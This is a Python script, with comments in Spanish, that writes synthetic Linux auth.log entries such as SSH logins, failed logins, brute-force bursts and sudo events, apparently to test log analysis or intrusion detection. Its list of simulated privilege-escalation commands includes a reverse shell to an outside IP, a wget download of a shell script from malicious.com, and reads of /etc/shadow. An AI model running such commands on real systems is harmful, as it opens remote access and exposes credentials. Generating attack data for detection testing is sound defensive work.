import random
import time
import logging
from datetime import datetime, timezone, timedelta
from pathlib import Path

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s - %(message)s"
)
logger = logging.getLogger(__name__)

# --- Datos realistas para simulación ---

VALID_USERS = ["emiliano", "admin", "deploy", "ubuntu", "root"]
INVALID_USERS = ["guest", "test", "oracle", "postgres", "pi",
                 "user", "ftpuser", "mail", "www-data", "mysql"]

INTERNAL_IPS = [
    "192.168.1.10", "192.168.1.15", "192.168.1.20",
    "10.0.0.5", "10.0.0.12"
]

ATTACK_IPS = [
    "45.33.32.156", "198.20.69.74", "80.82.77.139",
    "185.220.101.45", "94.102.49.190", "162.142.125.0",
    "167.248.133.0", "179.43.128.0"
]

NORMAL_IPS = [
    "200.68.128.1", "187.189.45.23", "201.134.56.78",
    "189.203.45.67", "148.243.12.34"
]

SERVICES = ["sshd", "sudo", "su", "login", "passwd"]
HOSTNAMES = ["prod-server-01", "web-server-02", "db-server-03"]

RAW_LOGS_PATH = Path("logs/raw")

def timestamp_now() -> str:
    """Formato exacto de /var/log/auth.log en Linux."""
    return datetime.now().strftime("%b %d %H:%M:%S")


def timestamp_random(hours_back: int = 24) -> str:
    """
    Genera un timestamp aleatorio dentro de las últimas N horas.
    Usado para simular datos históricos distribuidos en el tiempo.
    """
    now = datetime.now()
    delta = timedelta(
        hours=random.randint(0, hours_back),
        minutes=random.randint(0, 59),
        seconds=random.randint(0, 59)
    )
    past_time = now - delta
    return past_time.strftime("%b %d %H:%M:%S")


def generate_successful_login(ip: str, user: str, hostname: str) -> str:
    port = random.randint(49152, 65535)
    return (
        f"{timestamp_random()} {hostname} sshd[{random.randint(1000,9999)}]: "
        f"Accepted password for {user} from {ip} port {port} ssh2"
    )


def generate_failed_login(ip: str, user: str, hostname: str) -> str:
    port = random.randint(49152, 65535)
    return (
        f"{timestamp_random()} {hostname} sshd[{random.randint(1000,9999)}]: "
        f"Failed password for {user} from {ip} port {port} ssh2"
    )


def generate_invalid_user(ip: str, user: str, hostname: str) -> str:
    port = random.randint(49152, 65535)
    return (
        f"{timestamp_random()} {hostname} sshd[{random.randint(1000,9999)}]: "
        f"Invalid user {user} from {ip} port {port}"
    )


def generate_sudo_command(user: str, hostname: str, command: str) -> str:
    return (
        f"{timestamp_random()} {hostname} sudo[{random.randint(1000,9999)}]: "
        f"{user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND={command}"
    )


def generate_brute_force_attack(ip: str, hostname: str) -> list[str]:
    """
    Simula un ataque de fuerza bruta real:
    múltiples intentos fallidos desde la misma IP en poco tiempo.
    """
    logs = []
    user = random.choice(INVALID_USERS + VALID_USERS)
    attempts = random.randint(10, 25)
    for _ in range(attempts):
        logs.append(generate_failed_login(ip, user, hostname))
    return logs


def generate_normal_traffic(hostname: str) -> list[str]:
    """Genera actividad normal de un servidor."""
    logs = []
    ip = random.choice(INTERNAL_IPS + NORMAL_IPS)
    user = random.choice(VALID_USERS)

    # Login exitoso
    logs.append(generate_successful_login(ip, user, hostname))

    # Algunos comandos sudo normales
    if random.random() < 0.3:
        commands = ["/usr/bin/apt update", "/bin/systemctl restart nginx",
                    "/usr/bin/tail -f /var/log/syslog"]
        logs.append(generate_sudo_command(user, hostname, random.choice(commands)))

    return logs


def generate_privilege_escalation(hostname: str) -> list[str]:
    """Simula intento de escalada de privilegios."""
    logs = []
    user = random.choice(VALID_USERS[1:])  # No root

    suspicious_commands = [
        "/usr/bin/chmod 777 /etc/passwd",
        "/bin/bash -i >& /dev/tcp/45.33.32.156/4444 0>&1",
        "/usr/bin/wget http://malicious.com/shell.sh -O /tmp/shell.sh",
        "/bin/sh -c 'cat /etc/shadow'",
        "/usr/bin/python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
    ]
    logs.append(generate_sudo_command(
        user, hostname, random.choice(suspicious_commands)
    ))
    return logs


def write_logs(log_lines: list[str], filepath: Path) -> None:
    """Append logs al archivo — simula escritura continua de syslog."""
    with open(filepath, "a", encoding="utf-8") as f:
        for line in log_lines:
            f.write(line + "\n")


def run_generator(
    duration_seconds: int = 60,
    events_per_second: float = 2.0,
    attack_probability: float = 0.15,
    output_file: str = None
) -> Path:
    """
    Genera un stream de logs durante N segundos.

    Args:
        duration_seconds: cuántos segundos correr el generador
        events_per_second: frecuencia de eventos normales
        attack_probability: probabilidad de insertar un ataque (0.0 - 1.0)
        output_file: nombre del archivo de salida

    Returns:
        Path al archivo generado
    """
    RAW_LOGS_PATH.mkdir(parents=True, exist_ok=True)

    if output_file is None:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_file = f"auth_log_{timestamp}.log"

    filepath = RAW_LOGS_PATH / output_file
    hostname = random.choice(HOSTNAMES)

    logger.info(f"Iniciando generador de logs | host={hostname} | "
                f"duration={duration_seconds}s | output={filepath}")

    total_events = 0
    total_attacks = 0
    start_time = time.time()

    while time.time() - start_time < duration_seconds:
        logs_to_write = []

        # Decidir si este ciclo genera un ataque o tráfico normal
        if random.random() < attack_probability:
            attack_type = random.choice(["brute_force", "privilege_escalation"])

            if attack_type == "brute_force":
                attack_ip = random.choice(ATTACK_IPS)
                logs_to_write.extend(
                    generate_brute_force_attack(attack_ip, hostname)
                )
                logger.warning(f"⚠️  Ataque simulado: BRUTE FORCE desde {attack_ip}")

            elif attack_type == "privilege_escalation":
                logs_to_write.extend(
                    generate_privilege_escalation(hostname)
                )
                logger.warning(f"⚠️  Ataque simulado: PRIVILEGE ESCALATION")

            total_attacks += 1
        else:
            logs_to_write.extend(generate_normal_traffic(hostname))

        write_logs(logs_to_write, filepath)
        total_events += len(logs_to_write)

        time.sleep(1.0 / events_per_second)

    logger.info(
        f"Generación completada | "
        f"total_events={total_events} | "
        f"ataques_simulados={total_attacks} | "
        f"archivo={filepath}"
    )
    return filepath


if __name__ == "__main__":
    # Genera 30 segundos de logs con 15% de probabilidad de ataque
    output_path = run_generator(
        duration_seconds=30,
        events_per_second=3.0,
        attack_probability=0.20
    )

    # Muestra las últimas 10 líneas generadas
    with open(output_path, "r") as f:
        lines = f.readlines()

    logger.info(f"\nÚltimas 10 líneas generadas:")
    for line in lines[-10:]:
        print(line.strip())